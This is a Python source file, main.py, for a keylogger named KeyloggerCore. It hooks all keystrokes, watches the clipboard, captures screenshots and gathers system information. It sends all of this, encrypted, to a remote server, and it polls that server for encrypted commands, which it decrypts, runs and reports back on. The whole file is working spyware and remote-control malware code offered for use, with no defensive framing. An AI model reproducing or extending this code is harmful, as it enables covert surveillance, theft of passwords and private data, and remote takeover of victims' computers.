# ------------ main.py ------------
import threading
import time
import json
import logging
import sys
from datetime import datetime  # Explicitly ensure datetime is imported
from keyboard import hook, add_hotkey
from config import Config
from encryption.manager import EncryptionManager, EncryptionError
from network.communicator import ServerCommunicator, CommunicationError
from system.collector import SystemCollector
from commands.handler import CommandHandler, CommandError
from monitoring.logger import ActivityLogger
from PIL import Image
import io
import pyautogui

class KeyloggerCore:
    def __init__(self):
        self.client_id = Config.get_client_id()
        logging.info(f"Client ID: {self.client_id}")
        self.encryption = EncryptionManager(Config.ENCRYPTION_KEY)
        self.communicator = ServerCommunicator(self.client_id, self.encryption)
        self.logger = ActivityLogger(Config.BUFFER_LIMIT)
        self.running = True

    def start(self):
        self._init_hotkeys()
        self._start_service_threads()
        self._main_loop()

    def _init_hotkeys(self):
        add_hotkey(Config.EMERGENCY_HOTKEY, self.emergency_stop)
        hook(self.logger.log_keystroke)

    def _start_service_threads(self):
        threading.Thread(target=self._data_sync_loop, daemon=True).start()
        threading.Thread(target=self._command_loop, daemon=True).start()
        threading.Thread(target=self._clipboard_monitor_loop, daemon=True).start()

    def _capture_screenshot(self):
        try:
            screenshot = pyautogui.screenshot()
            # Convert directly to Pillow Image
            img = Image.frombytes('RGB', screenshot.size, screenshot.rgb)
            img_byte_arr = io.BytesIO()
            img.save(img_byte_arr, format='PNG')
            return img_byte_arr.getvalue()
        except Exception as e:
            self._handle_error(f"Screenshot capture error: {str(e)}")
            return None

    def _data_sync_loop(self):
        while self.running:
            try:
                logging.info("Starting data sync...")
                system_info = SystemCollector.collect_full()
                logging.info(f"Collected system info: {system_info}")
                screenshot = self._capture_screenshot()
                self.communicator.upload_data(
                    keystrokes=self.logger.buffer.copy(),
                    system_info=system_info,
                    screenshot=screenshot
                )
                logging.info("Data sync completed")
                self.logger.buffer.clear()
                logging.info(f"Sleeping for {Config.CHECK_INTERVAL} seconds")
                time.sleep(Config.CHECK_INTERVAL)
            except Exception as e:
                self._handle_error(f"Sync error: {str(e)}")
                logging.info("Sleeping for 5 seconds due to error")
                time.sleep(5)  # Prevent rapid retries on failure

    def _command_loop(self):
        while self.running:
            try:
                logging.info("Fetching commands from server...")
                commands = self.communicator.fetch_commands()
                logging.info(f"Received {len(commands)} commands: {commands}")
                if commands:
                    self._process_commands(commands)
                time.sleep(Config.COMMAND_POLL_INTERVAL)
            except Exception as e:
                self._handle_error(f"Command processing error: {str(e)}")
                time.sleep(5)  # Prevent rapid retries on failure

    def _clipboard_monitor_loop(self):
        while self.running:
            try:
                self.logger.log_clipboard()
                time.sleep(10)
            except Exception as e:
                self._handle_error(f"Clipboard monitor error: {str(e)}")

    def _process_commands(self, commands):
        for cmd in commands:
            try:
                if not all(k in cmd for k in ('id', 'command', 'type')):
                    raise CommandError(f"Invalid command structure: {cmd}")

                decrypted = self.encryption.decrypt(cmd['command'])
                logging.info(f"Decrypted command: {decrypted}")
                command_data = json.loads(decrypted)
                logging.info(f"Parsed command data: {command_data}")

                if 'type' not in command_data:
                    raise CommandError(f"Missing 'type' in decrypted command: {command_data}")

                result = CommandHandler.execute(
                    command_data['type'],
                    command_data.get('params', {})
                )
                logging.info(f"Command executed successfully: {command_data['type']}, Result: {result}")
                self.communicator.send_command_result(cmd['id'], result)

            except (KeyError, json.JSONDecodeError) as e:
                self._handle_error(f"Invalid command format: {str(e)}, Command: {cmd}")
            except CommandError as e:
                self._handle_error(f"Command error: {str(e)}, Command: {cmd}")
            except Exception as e:
                self._handle_error(f"Command execution failed: {str(e)}, Command: {cmd}")

    def _handle_error(self, message):
        logging.error(message)

    def emergency_stop(self):
        self.running = False
        logging.info("Emergency stop activated")
        sys.exit(0)

    def _main_loop(self):
        try:
            while self.running:
                time.sleep(1)
        except KeyboardInterrupt:
            self.emergency_stop()

if __name__ == "__main__":
    logging.basicConfig(
        filename=Config.ERROR_LOG_FILE,
        level=logging.DEBUG,
        format='%(asctime)s - %(levelname)s - %(message)s'
    )
    keylogger = KeyloggerCore()
    keylogger.start()